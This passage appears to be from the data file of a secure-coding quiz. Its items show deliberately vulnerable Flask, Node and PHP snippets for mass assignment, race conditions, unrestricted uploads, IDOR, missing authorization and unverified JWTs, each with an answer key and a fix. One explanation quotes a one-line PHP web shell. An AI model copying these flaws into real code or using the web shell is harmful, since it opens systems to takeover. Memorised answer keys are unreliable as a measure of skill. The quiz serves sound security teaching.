      "Flask's request.json automatically sanitizes fields",
      "setattr copies all request keys onto the model, including protected fields",
      "SQLAlchemy ignores unmapped column names",
      "JSON body size limits prevent this attack in production",
    ],
    correct: 1,
    explanation: "The loop has no allowlist — every key in the request body is written directly to the user model. An attacker adds is_admin: true or credit_balance: 9999 and overwrites fields they should never control.",
    fix: `ALLOWED = {'name', 'bio', 'avatar_url', 'email'}\nfor key in ALLOWED & request.json.keys():\n    setattr(user, key, request.json[key])`,
  },
  {
    id: 34,
    category: "Data Integrity",
    title: "Race Condition (TOCTOU)",
    language: "Python",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `@app.route('/redeem', methods=['POST'])
def redeem_voucher():
    code = request.json['code']
    voucher = db.vouchers.find_one({'code': code})

    if voucher['used']:               # 1. Check
        return jsonify({'error': 'Already redeemed'}), 400

    apply_discount(current_user)      # 2. Use (gap here)

    db.vouchers.update_one(           # 3. Mark used
        {'code': code},
        {'$set': {'used': True}}
    )
    return jsonify({'ok': True})`,
    question: "How can a user redeem the same voucher multiple times?",
    options: [
      "By decoding and re-encoding the voucher code",
      "By sending concurrent requests during the gap between check and update",
      "By manipulating the apply_discount return value",
      "By exploiting MongoDB eventual consistency",
    ],
    correct: 1,
    explanation: "Between the check (used=false) and the update (used=true) there is a time window. Two simultaneous requests both pass the check, both call apply_discount, and both commit. The voucher is redeemed twice.",
    fix: `# Atomic find-and-update — only succeeds if used was False\nresult = db.vouchers.find_one_and_update(\n    {'code': code, 'used': False},\n    {'$set': {'used': True}}\n)\nif not result:\n    return jsonify({'error': 'Already redeemed'}), 400`,
  },
  {
    id: 35,
    category: "Data Integrity",
    title: "Unrestricted File Upload",
    language: "PHP",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `<?php
if (isset($_FILES['avatar'])) {
    $file = $_FILES['avatar'];
    $name = $file['name'];       // e.g. "shell.php"
    $tmp  = $file['tmp_name'];

    // Save to public uploads directory
    move_uploaded_file($tmp, "uploads/" . $name);
    echo "Uploaded: uploads/" . $name;
}
?>`,
    question: "What is the immediate consequence of uploading a file named shell.php?",
    options: [
      "The file is renamed to prevent PHP execution",
      "PHP files served from uploads/ are rendered as plain text",
      "The uploaded PHP code executes on the server when the URL is visited",
      "move_uploaded_file refuses .php extensions by default",
    ],
    correct: 2,
    explanation: "The file is stored in the public uploads/ directory with its original .php extension. Visiting /uploads/shell.php causes the webserver to execute it. Uploading <?php system($_GET['cmd']); ?> gives full RCE.",
    fix: `$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));\n$allowed = ['jpg', 'jpeg', 'png', 'gif', 'webp'];\nif (!in_array($ext, $allowed)) die('Invalid file type');\n// Also verify MIME type and store files outside the web root`,
  },

  // ── ACCESS CONTROL ────────────────────────────────────────────────────────
  {
    id: 7,
    category: "Access Control",
    title: "Broken Access Control (IDOR)",
    language: "JavaScript",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `app.get('/api/orders/:orderId', async (req, res) => {
  const { orderId } = req.params;
  const order = await db.orders.findById(orderId);

  if (!order) return res.status(404).json({ error: 'Not found' });

  res.json(order);  // Returns order to any logged-in user
});`,
    question: "What vulnerability allows User A to see User B's orders?",
    options: [
      "Missing rate limiting",
      "Order IDs should be UUIDs",
      "No authorization check that the order belongs to the requesting user",
      "Missing input sanitization",
    ],
    correct: 2,
    explanation: "This is an Insecure Direct Object Reference (IDOR). Any authenticated user can access any order by changing the ID — the code never checks ownership.",
    fix: `if (order.userId !== req.user.id) {\n    return res.status(403).json({ error: 'Forbidden' });\n}`,
  },
  {
    id: 36,
    category: "Access Control",
    title: "Missing Function-Level Authorization",
    language: "Python",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `@app.route('/api/users', methods=['GET'])
@login_required
def list_users():
    users = User.query.all()
    return jsonify([u.to_dict() for u in users])

@app.route('/api/admin/users/delete', methods=['DELETE'])
def delete_user():                      # No decorator!
    user_id = request.json['user_id']
    User.query.filter_by(id=user_id).delete()
    db.session.commit()
    return jsonify({'deleted': user_id})`,
    question: "What allows a regular (or unauthenticated) user to delete any account?",
    options: [
      "DELETE method bypasses Flask's login_required decorator",
      "The admin endpoint has no authentication check at all",
      "Flask routes without decorators default to admin-only",
      "The JSON body is not validated before the delete executes",
    ],
    correct: 1,
    explanation: "The /api/admin/users/delete route has no @login_required or role check. Any unauthenticated HTTP request can call it. Admin functionality hidden by URL path alone is not access control.",
    fix: `@app.route('/api/admin/users/delete', methods=['DELETE'])\n@login_required\n@require_role('admin')\ndef delete_user():\n    ...`,
  },
  {
    id: 37,
    category: "Access Control",
    title: "Horizontal Privilege Escalation",
    language: "Node.js",
    difficulty: "HIGH",
    timeLimit: 60,
    diffColor: "#F97316",
    code: `app.put('/api/users/:id/settings', authenticate, async (req, res) => {
  const targetId = req.params.id;

  // Users edit their own settings; admins edit anyone
  if (req.user.id !== targetId && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }

  await db.users.update({ id: targetId }, req.body);
  res.json({ updated: true });
});

// Attacker sends body: { "role": "admin" }`,
    question: "The ownership check looks correct. What vulnerability remains?",
    options: [
      "The authenticate middleware can be bypassed with a null JWT",
      "A user passes their own ID and includes role in the body — ownership check passes",
      "req.params.id comparison is vulnerable to type coercion",
      "The PUT method is not protected by CSRF tokens",
    ],
    correct: 1,
    explanation: "A regular user calls the endpoint with their own ID (ownership check passes) and includes role:'admin' in the body. req.body is written directly to the database — including privileged fields.",
    fix: `// Strip privileged fields before writing\nconst { role, is_admin, plan, ...safeFields } = req.body;\nawait db.users.update({ id: targetId }, safeFields);`,
  },
  {
    id: 38,
    category: "Access Control",
    title: "Trusting JWT Claims Without Verification",
    language: "JavaScript",
    difficulty: "CRITICAL",
    timeLimit: 45,
    diffColor: "#EF4444",
    code: `app.get('/api/admin/stats', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];

  // Decode token payload without verifying signature
  const payload = JSON.parse(
    Buffer.from(token.split('.')[1], 'base64').toString()
  );

  if (payload.role === 'admin') {
    return res.json(getAdminStats());
  }
  res.status(403).json({ error: 'Forbidden' });
});`,
    question: "What allows any user to gain admin access?",
    options: [
      "split('.')[1] can be confused by URL-safe base64 padding",
      "The JWT payload is decoded without verifying the cryptographic signature",
      "Buffer.from does not support base64url encoding",
      "JSON.parse throws on JWTs with large payloads",
    ],
    correct: 1,
    explanation: "A JWT is header.payload.signature. This code decodes only the payload and reads role — but never verifies the HMAC/RSA signature. An attacker crafts their own JWT with role:'admin', base64-encodes it, and sends it. No server secret needed.",
    fix: `const jwt = require('jsonwebtoken');\nconst payload = jwt.verify(token, process.env.JWT_SECRET, {\n  algorithms: ['HS256'],\n});\nif (payload.role === 'admin') { ... }`,
  },
  {
    id: 20,
    category: "Architecture & Config",
    title: "Insufficient Logging",
    language: "Python",
    difficulty: "MEDIUM",
    timeLimit: 75,
    diffColor: "#EAB308",
    code: `def process_payment(user_id, amount, card_data):
    try:
        charge_stripe_api(amount, card_data)
        db.update_balance(user_id, amount)
        return True
    except Exception as e:
        # Something went wrong, return generic error
        return False`,
    question: "What is the primary security consequence of this error handling?",
    options: [
      "It leaks sensitive financial data to the user.",
      "It creates an unhandled race condition.",
      "A successful attack or persistent error leaves no forensic trace.",
      "It prevents the database from rolling back.",
    ],
    correct: 2,
    explanation: "Silently swallowing exceptions prevents security teams from detecting active attacks and makes forensic incident response impossible. You cannot investigate what you cannot see.",
    fix: `import logging\nexcept Exception as e:\n    logging.error(f"Payment failed for user {user_id}. Error: {str(e)}")\n    return False`,
  },
];
